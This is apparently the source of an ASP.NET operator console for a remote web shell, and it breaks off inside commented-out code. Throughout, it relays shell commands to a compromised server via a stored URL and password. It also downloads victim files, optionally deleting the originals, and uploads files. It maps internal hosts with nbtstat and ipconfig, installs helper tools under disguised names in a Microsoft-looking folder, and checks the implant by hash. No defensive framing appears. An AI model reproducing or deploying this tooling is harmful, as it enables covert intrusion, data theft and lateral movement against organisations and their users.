<%@ Page Language="C#" ValidateRequest="false" EnableViewState="false" %>

<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Security" %>
<%@ Import Namespace="System.Net.Mime" %>
<%@ Import Namespace="System.Threading" %>
<%@ Import Namespace="Newtonsoft.Json" %>

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <link href="js/semantic/semantic.min.css" rel="stylesheet" />
    <link href="css/main.css" rel="stylesheet" />
    <link href="js/components/downloadbox.css" rel="stylesheet" />
    <link href="js/DataTables-1.10.16/css/jquery.dataTables.min.css" rel="stylesheet" />
    <script src="js/jquery/jquery-3.2.1.min.js"></script>
    <script src="js/DataTables-1.10.16/js/jquery.dataTables.min.js"></script>
    <script src="js/semantic/semantic.min.js"></script>
    <script src="js/utility.js"></script>
    <script src="js/main.js"></script>
    <script src="js/send.js"></script>
    <script src="js/explorer.js"></script>
    <script src="js/components/downloadbox.js"></script>
    <script src="js/components/targetcomuter.js"></script>
    <script src="js/components/spycheck.js"></script>
    <script src="js/components/networkdownlaoder.js"></script>
    <script src="js/components/modules.js"></script>
    <script src="js/components/cmd.js"></script>
    <%
        try
        {
            //InitiateSSLTrust();
            Session.Timeout = 100; // 100 minute

            NameValueCollection t = HttpContext.Current.Request.Form;

            method selectedMethod = method.auth;

            if (!string.IsNullOrEmpty(t["isajax"]))
                isAjax = true;

            string methodStr = unpack(t["m"]);
            if (!string.IsNullOrEmpty(methodStr))
            {
                int methodID = int.Parse(methodStr);
                selectedMethod = (method)methodID;

                url = unpack(t["url"]);

                if (string.IsNullOrEmpty(url))
                {
                    if (HttpContext.Current.Request.Cookies["url"] != null)
                        url = fb(HttpContext.Current.Request.Cookies["url"].Value);
                }

                string[] urlp = url.Split(';');
                if (urlp.Length > 1)
                {
                    //url = urlp[0];
                    p = urlp[1];
                }

                if (string.IsNullOrEmpty(p))
                {
                    if (HttpContext.Current.Request.Cookies["p"] != null)
                        p = fb(HttpContext.Current.Request.Cookies["p"].Value);
                }

                if (HttpContext.Current.Request.Cookies["loginStyle"] != null)
                    loginStyle = fb(HttpContext.Current.Request.Cookies["loginStyle"].Value);

                switch (selectedMethod)
                {
                    case method.auth:
                        auth();
                        break;
                    case method.localExplore:
                        SpecialScript = "$('#btnExpror').click();";
                        SpecialScript = @"
openTab(document.getElementById('tabExp'), 'tbDir');
document.getElementsByName('exadd')[0].value = '" + unpack(t["exadd"]).Replace("\\", "\\\\") + @"';
$('#btnExpror').click();";
                        break;
                    case method.command:
                        command(unpack(t["cmd"]));
                        break;
                    case method.downloadTest:
                        downloadTest(t);
                        break;
                    case method.download:
                        Thread thr = new Thread(() => download(unpack(t["don"]), unpack(t["isdelete"]), unpack(t["localPath"]), unpack(t["downloadguid"])));
                        thr.Start();
                        break;
                    case method.checkDownloadProgress:
                        checkDownloadProgress(unpack(t["downloadguid"]), unpack(t["lastsize"]), unpack(t["lasttime"]));
                        break;
                    case method.upload:
                        upload(HttpContext.Current.Request.Files["uploadFile"], t["uploadPath"], t["isExp"]);
                        break;
                    case method.checkModules:
                        checkModules();
                        break;
                    case method.installModule:
                        installModule(unpack(t["mname"]));
                        break;
                    case method.uninstallModule:
                        uninstallModule(unpack(t["mname"]));
                        break;
                    case method.cmd7z:
                        cmd7z(unpack(t["7zclevel"]), unpack(t["7zaddress"]), unpack(t["7zfiles"]), unpack(t["7zvsize"]), unpack(t["7zvmode"]), unpack(t["7zexclude"]));
                        break;
                    case method.spycheck:
                        spycheck(unpack(t["loc"]));
                        break;
                    case method.getIPFromNbt:
                        getIPFromNbt(unpack(t["mode"]), unpack(t["input"]));
                        break;
                    case method.GetLogicDrives:
                        GetLogicDrives(unpack(t["exadd"]), unpack(t["adminU"]), unpack(t["adminP"]));
                        break;
                    case method.NetworkDownloaderCheck:
                        NetworkDownloaderCheck(unpack(t["cn"]),unpack(t["ip"]));
                        break;
                    case method.NetworkDownloaderLog:
                        NetworkDownloaderLog(unpack(t["cn"]),unpack(t["log"]));
                        break;
                    case method.NetworkDownloaderError:
                        NetworkDownloaderError(unpack(t["cn"]),unpack(t["error"]));
                        break;
                    case method.NetworkDownloaderDone:
                        NetworkDownloaderDone(unpack(t["cn"]));
                        break;
                    case method.NetworkDownloaderDir:
                        NetworkDownloaderDir(unpack(t["cn"]),unpack(t["filename"]), unpack(t["text"]));
                        break;
                    default:
                        proxy(t);
                        break;
                }
            }
            //else
            //    auth();
        }
        catch (Exception ex)
        {
            response("Error : " + ex.Message);
        }
    %>
    <script runat="server">
        enum method
        {
            auth = 0,
            command = 1,
            upload = 2,
            uploadbase64 = 3,
            delete = 4,
            download = 5,
            changeTime = 6,
            sqlQuery = 7,
            explorer = 8,
            getsize = 9,
            getlocation = 10,
            rename = 11,
            copy = 12,
            view = 13,
            commandAjax = 14,
            downloadTest = 15,
            checkModules = 16,
            installModule = 17,
            uninstallModule = 18,
            cmd7z = 19,
            authAjax = 20,
            getlocationAjax = 21,
            spycheck = 22,
            localExplore = 23,
            checkDownloadProgress = 25,
            getIPFromNbt = 26,
            GetLogicDrives = 27,
            NetworkDownloaderCheck = 28,
            NetworkDownloaderLog = 29,
            NetworkDownloaderError = 30,
            NetworkDownloaderDone = 31,
            NetworkDownloaderDir = 32

        };


        string url, p, pro, cmd, sav, vir, nen, upb, upd, del, don, hid, tfil, ttar, ttim, baseFile, baseAddr, baseVir, baseName, sqc, sqq, exadd, adminU, adminP, cmdB, loc;
        string SpecialScript, loginStyle;
        string BaseAddress = @"C:\Users\Public\Libraries\";
        string DownloadLocation = @"C:\Users\Public\Libraries\DownloadFiles\";
        string SpyCheckLocation = @"C:\Users\Public\Libraries\SpyCheck\";
        string LocationNetworkDownloader = @"C:\Users\Public\Libraries\NetworkDownloader\";

        //string DownloadTemp = @"C:\Users\Public\Libraries\DownloadTemp\";
        bool isAjax = false;
        string tb(string a) { string ret = ""; try { ret = string.IsNullOrEmpty(a) ? a : Convert.ToBase64String(Encoding.UTF8.GetBytes(a)); } catch { } return ret; }
        string fb(string a) { string ret = ""; try { ret = string.IsNullOrEmpty(a) ? a : Encoding.UTF8.GetString(Convert.FromBase64String(a)); } catch { } return ret; }

        void proxy(NameValueCollection t)
        {
            string ret = "Error : -";
            try
            {
                ret = SendRequest(url, t);
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }

        string unpack(string data) { return isAjax ? fb(data) : data; }

        void GetLogicDrives(string address, string adminU, string adminP)
        {
            string ret = "Error : -";
            try
            {
                //if (address.ToLower().Contains("\\\\localhost"))
                ret = SendRequest(url, new NameValueCollection() {
                    { "m", tb(((int)method.explorer).ToString())},
                    { "p", tb(p)},
                    { "exadd", tb(address)},
                    { "adminU", tb(adminU)},
                    { "adminP", tb(adminP)}
                });
                //else
                //{

                //}
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        void NetworkDownloaderCheck(string computerName, string ip)
        {
            string ret = "Error : -";
            try
            {
                ret = "ok";
                if (Directory.Exists(LocationNetworkDownloader))
                {
                    if (string.IsNullOrEmpty(computerName))
                    {
                        //-+\s+(\S+)
                        //nbtstat -a 192.168.100.16

                        string nbtstat = SendRequest(url, new NameValueCollection() {
                            { "m", tb(((int)method.command).ToString())},
                            { "p", tb(p)},
                            { "cmd", tb(string.Format("nbtstat -a {0}",ip))}
                        });

                        if (nbtstat.Contains("Host not found"))
                        {
                            ret = "Error : Cannot find computer name from IP Address (Host not found)";
                        }
                        else
                        {
                            Regex reg = new Regex(@"-+\s+(\S+)");
                            MatchCollection regResult = reg.Matches(nbtstat);
                            if (regResult.Count > 0)
                            {
                                computerName = regResult[0].Groups[1].Value;
                            }
                            else
                            {
                                ret = "Error : Cannot find computer name from IP Address ("+nbtstat+")";
                            }
                        }
                    }

                    if (!string.IsNullOrEmpty(computerName))
                    {

                        string targetPathIP = CheckDirectory(url, LocationNetworkDownloader) + ip.TrimStart('\\') + "\\";
                        string targetPathCN = CheckDirectory(url, LocationNetworkDownloader) + computerName + "\\";
                        if (Directory.Exists(targetPathCN))
                        {
                            if (File.Exists(targetPathCN + "done.txt"))
                                ret = "done|" + File.ReadAllText(targetPathCN + "done.txt");
                            else if (File.Exists(targetPathCN + "error.txt"))
                                ret = "error|" + File.ReadAllText(targetPathCN + "error.txt");

                            if (Directory.Exists(targetPathIP))
                            {
                                Directory.Move(targetPathIP, targetPathCN + ip.TrimStart('\\'));
                            }
                        }
                        else if (Directory.Exists(targetPathIP))
                        {
                            Directory.Move(targetPathIP, targetPathCN);

                            if (File.Exists(targetPathCN + "done.txt"))
                                ret = "done|" + File.ReadAllText(targetPathCN + "done.txt");
                            else if (File.Exists(targetPathCN + "error.txt"))
                                ret = "error|" + File.ReadAllText(targetPathCN + "error.txt");
                        }
                        else
                            Directory.CreateDirectory(targetPathCN);

                        File.AppendAllText(targetPathCN + "ip.txt", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " : " + ip);
                    }
                }
                else
                    Directory.CreateDirectory(LocationNetworkDownloader);
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        void NetworkDownloaderLog(string cn, string log)
        {
            string ret = "Error : -";
            try
            {
                string targetPath = CheckDirectory(url, LocationNetworkDownloader) + cn + "\\";
                File.AppendAllText(targetPath + "log.txt", string.Format("---------------------------------------------------------------------\r\n[{0}]\r\n{1}\r\n", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), log));
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        void NetworkDownloaderError(string cn, string error)
        {
            string ret = "Error : -";
            try
            {
                string targetPath = CheckDirectory(url, LocationNetworkDownloader) + cn + "\\";
                File.AppendAllText(targetPath + "error.txt", string.Format("---------------------------------------------------------------------\r\n[{0}]\r\n{1}\r\n", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), error));
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        void NetworkDownloaderDone(string cn)
        {
            string ret = "Error : -";
            try
            {
                string targetPath = CheckDirectory(url, LocationNetworkDownloader) + cn + "\\";
                File.AppendAllText(targetPath + "done.txt", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        void NetworkDownloaderDir(string cn, string filename, string text)
        {
            string ret = "Error : -";
            try
            {
                string targetPath = CheckDirectory(url, LocationNetworkDownloader) + cn + "\\";
                File.AppendAllText(targetPath + filename + ".txt", text);
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }

        void upload(HttpPostedFile uploadFile, string uploadPath, string isExp)
        {
            string ret = string.Empty;
            try
            {
                if (uploadFile != null && uploadFile.ContentLength > 0)
                {
                    ret = SendFile(uploadFile, uploadPath);
                    if (!string.IsNullOrEmpty(isExp))
                    {
                        SpecialScript = @"
openTab(document.getElementById('tabExp'), 'tbDir');
document.getElementsByName('exadd')[0].value = '" + uploadPath.Replace("\\", "\\\\") + @"';
document.getElementById('btnExpror').click();";
                    }
                }
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            response(ret);
        }

        public string UploadFile(Stream fStream, string fileName, string dataName, List<KeyValuePair<string, string>> formData)
        {
            HttpWebRequest requestToServerEndpoint = (HttpWebRequest)WebRequest.Create(url);
            string boundaryString = "----sdfERASDGsdf342GA";

            requestToServerEndpoint.Method = WebRequestMethods.Http.Post;
            requestToServerEndpoint.ContentType = "multipart/form-data; boundary=" + boundaryString;
            requestToServerEndpoint.KeepAlive = true;
            requestToServerEndpoint.Credentials = System.Net.CredentialCache.DefaultCredentials;

            MemoryStream postDataStream = new MemoryStream();
            StreamWriter postDataWriter = new StreamWriter(postDataStream);

            foreach (var item in formData)
            {
                postDataWriter.Write("\r\n--" + boundaryString + "\r\n");
                postDataWriter.Write("Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}",
                item.Key,
                tb(item.Value));
            }

            postDataWriter.Write("\r\n--" + boundaryString + "\r\n");
            postDataWriter.Write("Content-Disposition: form-data;"
            + "name=\"{0}\";"
            + "filename=\"{1}\""
            + "\r\nContent-Type: multipart/form-data\r\n\r\n",
            dataName,
            fileName);
            postDataWriter.Flush();

            Stream fileStream = fStream;
            byte[] buffer = new byte[1024];
            int bytesRead = 0;
            while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) != 0)
            {
                postDataStream.Write(buffer, 0, bytesRead);
            }
            fileStream.Close();

            postDataWriter.Write("\r\n--" + boundaryString + "--\r\n");
            postDataWriter.Flush();

            requestToServerEndpoint.ContentLength = postDataStream.Length;

            using (Stream s = requestToServerEndpoint.GetRequestStream())
            {
                postDataStream.WriteTo(s);
            }
            postDataStream.Close();

            WebResponse response = requestToServerEndpoint.GetResponse();
            StreamReader responseReader = new StreamReader(response.GetResponseStream());
            string replyFromServer = responseReader.ReadToEnd();

            return fb(replyFromServer);
        }
        public string SendFile(HttpPostedFile uploadFile, string uploadPath)
        {
            List<KeyValuePair<string, string>> formData = new List<KeyValuePair<string, string>>();
            formData.Add(new KeyValuePair<string, string>("uploadPath", uploadPath));
            formData.Add(new KeyValuePair<string, string>("m", ((int)method.upload).ToString()));
            formData.Add(new KeyValuePair<string, string>("p", p));

            return UploadFile(uploadFile.InputStream, uploadFile.FileName, "uploadFile", formData);
        }

        void auth()
        {
            string ret = string.Empty;
            try
            {
                if (string.IsNullOrEmpty(p))
                {
                    if (HttpContext.Current.Request.Cookies["p"] != null)
                        p = fb(HttpContext.Current.Request.Cookies["p"].Value);
                }
                else
                {
                    HttpCookie coo = new HttpCookie("p", tb(p));
                    coo.Expires = DateTime.Now.AddDays(1);
                    HttpContext.Current.Response.SetCookie(coo);
                }

                if (string.IsNullOrEmpty(url))
                {
                    if (HttpContext.Current.Request.Cookies["url"] != null)
                        url = fb(HttpContext.Current.Request.Cookies["url"].Value);
                }
                else
                {
                    HttpCookie coo = new HttpCookie("url", tb(url));
                    coo.Expires = DateTime.Now.AddDays(1);
                    HttpContext.Current.Response.SetCookie(coo);
                }

                if (!string.IsNullOrEmpty(p) && !string.IsNullOrEmpty(url))
                {

                    SpecialScript = "$('#btnLogin').click();";

                    //string HtmlResult = SendRequest(url, new NameValueCollection() {
                    //        { "m", ((int)method.auth).ToString()},
                    //        { "p", p}
                    //    });

                    //if (HtmlResult == "True")
                    //{
                    //    ret = "Login successful" + Environment.NewLine;
                    //    loginStyle = "login";
                    //    getLoc();
                    //    SpecialScript = "document.getElementById('chkModules').click();";
                    //}
                    //else
                    //{
                    //    ret = "Login failed" + Environment.NewLine;
                    //    loginStyle = "logout";
                    //}

                    //HttpCookie coo = new HttpCookie("loginStyle", tb(loginStyle));
                    //coo.Expires = DateTime.Now.AddDays(1);
                    //HttpContext.Current.Response.SetCookie(coo);
                }
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }

            response(ret);
        }
        void response(string res)
        {
            log.InnerHtml = res;
        }
        void responseAjax(string res)
        {
            Response.Clear();
            Response.Write(tb(res));
            Response.Flush();
            Response.SuppressContent = true;
            ApplicationInstance.CompleteRequest();
        }

        void getLoc()
        {
            loc = SendRequest(url, new NameValueCollection() {
                { "m", ((int)method.getlocation).ToString()},
                { "p", p}
            });
        }

        void spycheck(string location)
        {
            string ret = "Error : -";
            try
            {
                string[] parts1 = url.Split('/');
                string filename = location + parts1[parts1.Length - 1].Split('?')[0];
                if (!filename.EndsWith(".aspx"))
                    filename += ".aspx";
                string filetext = SendRequest(url, new NameValueCollection() {
                    { "m", tb(((int)method.command).ToString())},
                    { "p", tb(p)},
                    { "cmd", tb(string.Format("type \"{0}\"",filename))}
                });
                filetext = filetext.Remove(0, filetext.IndexOf(Environment.NewLine) + 2);
                filetext = filetext.Remove(0, filetext.IndexOf(Environment.NewLine) + 2);
                filetext = filetext.Substring(filetext.IndexOf("&lt;%@"));
                string f = Convert.ToBase64String(new System.Security.Cryptography.SHA256CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(filetext)));
                if ("wekE4IIbVM9Or+s+Dt97yKSrkMvJvUzw22QA2cuaz7w=" == Convert.ToBase64String(new System.Security.Cryptography.SHA256CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(filetext))))
                    ret = "True";
                else
                {
                    ret = "False";

                    Uri myUri = new Uri(url);
                    string host = myUri.Host;

                    string path = SpyCheckLocation + host + "\\";

                    if (!Directory.Exists(path))
                        Directory.CreateDirectory(path);

                    File.WriteAllText(path + Path.GetFileNameWithoutExtension(myUri.AbsolutePath) + "_" + DateTime.Now.ToString("yyyy-MM-dd-HH-mm-ss") + Path.GetExtension(myUri.AbsolutePath), HttpUtility.HtmlDecode(filetext));
                }
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }

        void command(string cmd)
        {
            SpecialScript = @"
$('#inpCmd').val(b64DecodeUnicode('" + tb(cmd) + @"'));
command($('#inpCmd').get(0));";
        }

        private string CheckDirectory(string url, string dirPath)
        {
            string newPath = string.Empty;

            if (!dirPath.EndsWith("\\"))
                dirPath += "\\";

            Uri myUri = new Uri(url);
            string host = myUri.Host;

            newPath = dirPath + host + "\\";

            if (!Directory.Exists(newPath))
                Directory.CreateDirectory(newPath);

            //if (!Directory.Exists(DownloadTemp))
            //    Directory.CreateDirectory(DownloadTemp);

            return newPath;
        }

        class NbtComputer
        {
            public string IP { get; set; }
            public string Domain { get; set; }
            public string ComputerName { get; set; }
            public List<string> Props { get; set; }
            public string Mac { get; set; }
            public string FullDomain { get; set; }
        }
        class NbtResult
        {
            public string Log { get; set; }
            public List<NbtComputer> NbtComputers { get; set; }
        }

        private void getIPFromNbt(string mode, string input)
        {
            NbtResult nbtresult = new NbtResult();
            nbtresult.NbtComputers = new List<NbtComputer>();
            string ret = "Error : -";
            try
            {
                List<string> IPs = new List<string>();

                if (mode == "ipconfig")
                {
                    string ipconfig = SendRequest(url, new NameValueCollection() {
                        { "m", tb(((int)method.command).ToString())},
                        { "p", tb(p)},
                        { "cmd", tb(string.Format("ipconfig /all 2>&1"))}
                    });

                    Regex rxIPconfig = new Regex(@"(IPv4 Address)[\.\s]+:\s(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})");
                    foreach (Match match in rxIPconfig.Matches(ipconfig))
                    {
                        IPs.Add(match.Groups[2].Value + "/24");
                    }

                    //nbtresult.Log = "IPs that gatter from ipconfig /all :" + Environment.NewLine;
                }
                else
                {
                    string[] tempSplit = input.Split(',');
                    foreach (string item in tempSplit)
                    {
                        IPs.Add(item);
                    }
                }

                //foreach (string ip in IPs)
                //{
                //    nbtresult.Log += ip + Environment.NewLine;
                //}
                //nbtresult.Log += Environment.NewLine + "try nbt on this IPs :" + Environment.NewLine;

                foreach (string ip in IPs)
                {
                    int count = 0;
                    string nbtResult = SendRequest(url, new NameValueCollection() {
                        { "m", tb(((int)method.command).ToString())},
                        { "p", tb(p)},
                        { "cmd", tb(string.Format(@"{0} -f {1} 2>&1", moduleFolder + ModuleFileNameTarget[ModuleName.mdlnbt.ToString()].Value,ip))}
                    });

                    Regex rxNbtResult = new Regex(@"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+(\S*)(\s+\w+)+\r\n(\s+\S+\s+\S+\s+\w+\s+[\w|\s]+\r\n)+\s+(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})\s+\w+\s+(\S+)\r\n");
                    foreach (Match item in rxNbtResult.Matches(nbtResult))
                    {
                        count++;
                        NbtComputer nc = new NbtComputer();
                        nc.IP = item.Groups[1].Value;
                        nc.Domain = item.Groups[2].Value.Split('\\')[0];
                        nc.ComputerName = item.Groups[2].Value.Split('\\')[1];
                        nc.Props = new List<string>();
                        foreach (Capture c in item.Groups[3].Captures)
                        {
                            nc.Props.Add(c.Value.Trim());
                        }
                        nc.Mac = item.Groups[5].Value;
                        nc.FullDomain = item.Groups[6].Value;

                        nbtresult.NbtComputers.Add(nc);
                    }
                    nbtresult.Log += ip + " -> " + count + Environment.NewLine;
                }

                ret = JsonConvert.SerializeObject(nbtresult);
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }

        enum DownloadStatus
        {
            Requested,
            Downloading,
            Pause,
            Error,
            Complete
        }
        private void DownloadUpdateStatus(string localPath, string downloadguid, DownloadStatus status, DateTime startDate, long totalsize, long downloadedsize)
        {
            //string text = string.Format("{0}{1}{2}{3}",
            //        status.ToString() + Environment.NewLine,
            //        startDate.ToString("yyyy-MM-dd HH:mm:ss.fff") + Environment.NewLine,
            //        totalsize.ToString() + Environment.NewLine,
            //        downloadedsize.ToString() + Environment.NewLine
            //        );

            NameValueCollection data = new NameValueCollection() {
                { "status", status.ToString()},
                { "startdate", startDate.ToString("yyyy-MM-dd HH:mm:ss.fff")},
                { "totalsize", totalsize.ToString()},
                { "downloadedsize", downloadedsize.ToString()}
            };

            Session[downloadguid] = data;

            //File.AppendAllText(DownloadTemp + Path.GetFileName(localPath), text);

            //using(TextWriter txtWriter = new StreamWriter(File.Open(DownloadTemp + Path.GetFileName(localPath), FileMode.Truncate)))
            //{
            //    txtWriter.Write(text);
            //}

            //using (TextWriter fs = new FileStream(DownloadTemp + Path.GetFileName(localPath), FileMode.Open, FileAccess.Write, FileShare.ReadWrite))
            //{
            //    using (var sr = new StreamWriter(fs, Encoding.Default))
            //    {
            //        // read the stream
            //        //...
            //    }
            //}

        }

        private string DownLoadFileByWebRequest(string urlAddress, string localPath, string downloadguid, NameValueCollection postParam)
        {
            string ret = string.Empty;
            try
            {
                DateTime StartDate = DateTime.Now;
                HttpWebRequest request = null;
                HttpWebResponse response = null;
                request = (HttpWebRequest)HttpWebRequest.Create(urlAddress);
                request.Timeout = 30000;  //8000 Not work
                request.Method = "POST";
                StringBuilder postBuilder = new StringBuilder();
                for (int i = 0; i < postParam.Count; i++)
                {
                    postBuilder.AppendFormat("{0}={1}", Uri.EscapeDataString(postParam.GetKey(i)), Uri.EscapeDataString(tb(postParam.Get(i))));
                    if (i < postParam.Count - 1)
                    {
                        postBuilder.Append("&");
                    }
                }
                byte[] postBytes = Encoding.ASCII.GetBytes(postBuilder.ToString());
                request.ContentLength = postBytes.Length;
                request.ContentType = "application/x-www-form-urlencoded";
                var stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();
                stream.Dispose();

                response = (HttpWebResponse)request.GetResponse();
                ContentDisposition disposition = new ContentDisposition(response.Headers["content-disposition"]);
                long fileSize = disposition.Size;
                Stream s = response.GetResponseStream();

                FileStream os = new FileStream(localPath, FileMode.OpenOrCreate, FileAccess.Write);
                byte[] buff = new byte[8 * 1024];
                int c = 0;
                long totalGet = 0;
                //long lastUpdateSize = 0;
                //DateTime lastUpdateTime = StartDate;
                while ((c = s.Read(buff, 0, buff.Length)) > 0)
                {
                    totalGet += c;

                    os.Write(buff, 0, c);
                    os.Flush();
                    //DateTime saveTime = DateTime.Now;
                    //DownloadUpdateStatus(localPath, downloadguid, DownloadStatus.Downloading, StartDate, lastUpdateTime, saveTime, fileSize, totalGet, lastUpdateSize);
                    DownloadUpdateStatus(localPath, downloadguid, DownloadStatus.Downloading, StartDate, fileSize, totalGet);
                    //if (totalGet < fileSize)
                    //{
                    //    lastUpdateSize = totalGet;
                    //    lastUpdateTime = saveTime;
                    //}
                }
                os.Close();
                s.Close();

                //DownloadUpdateStatus(localPath, downloadguid, DownloadStatus.Complete, StartDate, lastUpdateTime, DateTime.Now, fileSize, totalGet, lastUpdateSize);
                DownloadUpdateStatus(localPath, downloadguid, DownloadStatus.Complete, StartDate, fileSize, totalGet);

                ret = (string.Format("File \"{0}\" successfuly downloaded : \"{1}\"", Path.GetFileName(localPath), localPath));

            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }

            return ret;
        }
        void downloadTest(NameValueCollection t)
        {
            string ret = "Error : -";
            try
            {
                ret = SendRequest(url, t);
                if (!ret.ToLower().StartsWith("error"))
                {
                    string filePath = DownloadLocation;
                    filePath = CheckDirectory(url, filePath);

                    string filename = Path.GetFileName(unpack(t["don"]));
                    string localPath = filePath + filename;
                    int fileIndex = 1;
                    while (File.Exists(localPath))
                    {
                        localPath = filePath + Path.GetFileNameWithoutExtension(filename) + "(" + (fileIndex++) + ")" + Path.GetExtension(filename);
                    }

                    CreateEmptyFile(localPath);
                    string downloadguid = Guid.NewGuid().ToString();
                    DownloadUpdateStatus(localPath, downloadguid, DownloadStatus.Requested, DateTime.Now, 0, 0);
                    ret = string.Format("{{\"message\":\"{0}\",\"localPath\":\"{1}\",\"downloadguid\":\"{2}\"}}", tb(ret), tb(localPath), tb(downloadguid));
                }
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }

        void download(string don, string isdelete, string localPath, string downloadguid)
        {
            string ret = "true";

            try
            {
                ret = DownLoadFileByWebRequest(url, localPath, downloadguid, new NameValueCollection() {
                    { "m", ((int)method.download).ToString()},
                    { "p", p},
                    { "don", don}
                });

                if (isdelete.ToLower() == "true")
                {
                    string cmd = "del \"" + don + "\" 2>&1";
                    ret += Environment.NewLine + SendRequest(url, new NameValueCollection() {
                        { "m", tb(((int)method.command).ToString())},
                        { "p", tb(p)},
                        { "cmd", tb(cmd)}
                    });
                }
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            //responseAjax(ret);
        }

        void checkDownloadProgress(string downloadguid, string lastsizestr, string lasttimestr)
        {
            string ret = "Error : -";
            try
            {
                string status = "NotSet";
                double Percent = 0;
                string Size = "-";
                string Speed = "-";
                string Remain = "-";
                long LastSize = long.Parse(lastsizestr);
                DateTime Now = DateTime.Now;
                DateTime LastTime = Now;
                if (lasttimestr != "0")
                    LastTime = DateTime.Parse(lasttimestr);

                if (Session[downloadguid] != null)
                {
                    NameValueCollection data = (NameValueCollection)Session[downloadguid];
                    status = data["status"];

                    if (status != DownloadStatus.Requested.ToString())
                    {
                        DateTime timeStart = DateTime.Parse(data["startdate"]);
                        long total = long.Parse(data["totalsize"]);
                        long get = long.Parse(data["downloadedsize"]);

                        Percent = Math.Round(((double)get / total) * 100, 2);
                        Size = sizeFix(get) + " of " + sizeFix(total);

                        double diff = 1;
                        if (lasttimestr == "0")
                            diff = (Now - timeStart).TotalSeconds;
                        else
                            diff = (Now - LastTime).TotalSeconds;

                        double s = (double)((get - LastSize) / diff);
                        Speed = sizeFix((long)s, true) + "/sec";
                        if (status == DownloadStatus.Complete.ToString())
                        {
                            Remain = timeFix((long)(Now - timeStart).TotalMilliseconds);
                            Session.Remove(downloadguid);
                        }
                        else
                            Remain = timeFix((long)((total - get) / s * 1000)) + " left";

                        lastsizestr = get.ToString();
                        lasttimestr = Now.ToString("yyyy-MM-dd HH:mm:ss.fff");
                    }
                }

                ret = string.Format("{{\"status\":\"{0}\",\"percent\":\"{1}\",\"size\":\"{2}\",\"speed\":\"{3}\",\"remain\":\"{4}\",\"lastsize\":\"{5}\",\"lasttime\":\"{6}\"}}", status, Percent, Size, Speed, Remain, tb(lastsizestr), tb(lasttimestr));
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }


        #region [ Modules ]
        string moduleFolder = @"C:\ProgramData\Microsoft\SettingsTools\";
        KeyValueConfigurationCollection ModuleFileName = new KeyValueConfigurationCollection() {
            { ModuleName.mdl7z.ToString(),"7za.exe"},
            { ModuleName.mdlrx.ToString(),"rx.exe"},
            { ModuleName.mdlnbt.ToString(),"nbt.exe"},
            { ModuleName.mdlhb.ToString(),"hb.exe"}
        };
        KeyValueConfigurationCollection ModuleFileNameTarget = new KeyValueConfigurationCollection() {
            { ModuleName.mdl7z.ToString(),"fqrzb.exe"},
            { ModuleName.mdlrx.ToString(),"nhrf.exe"},
            { ModuleName.mdlnbt.ToString(),"qbtup.exe"},
            { ModuleName.mdlhb.ToString(),"tysrr.exe"}
        };
        enum ModuleName
        {
            mdl7z,
            mdlrx,
            mdlnbt,
            mdlhb
        };
        void checkModules()
        {
            string ret = "Error : -";
            try
            {

                string dirModule = SendRequest(url, new NameValueCollection() {
                    { "m", tb(((int)method.command).ToString())},
                    { "p", tb(p)},
                    { "cmd", tb(string.Format("dir \"{0}\"",moduleFolder))}
                });

                ret = "{\"modules\":[";
                string mdlList = string.Empty;
                if (dirModule.Contains(ModuleFileNameTarget[ModuleName.mdl7z.ToString()].Value))
                    mdlList += string.Format("\"{0}\"",ModuleName.mdl7z.ToString());
                if (dirModule.Contains(ModuleFileNameTarget[ModuleName.mdlrx.ToString()].Value))
                {
                    if (!string.IsNullOrEmpty(mdlList))
                        mdlList += ",";
                    mdlList += string.Format("\"{0}\"",ModuleName.mdlrx.ToString());
                }
                if (dirModule.Contains(ModuleFileNameTarget[ModuleName.mdlnbt.ToString()].Value))
                {
                    if (!string.IsNullOrEmpty(mdlList))
                        mdlList += ",";
                    mdlList += string.Format("\"{0}\"",ModuleName.mdlnbt.ToString());
                }
                if (dirModule.Contains(ModuleFileNameTarget[ModuleName.mdlhb.ToString()].Value))
                {
                    if (!string.IsNullOrEmpty(mdlList))
                        mdlList += ",";
                    mdlList += string.Format("\"{0}\"",ModuleName.mdlhb.ToString());
                }
                ret += mdlList + "]}";
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }

        // the Old server side installModule
        //void installModule(HttpPostedFile mfile, string mname)
        //{
        //    string ret = "Error : -";
        //    try
        //    {
        //        if (!System.IO.Directory.Exists(moduleFolder))
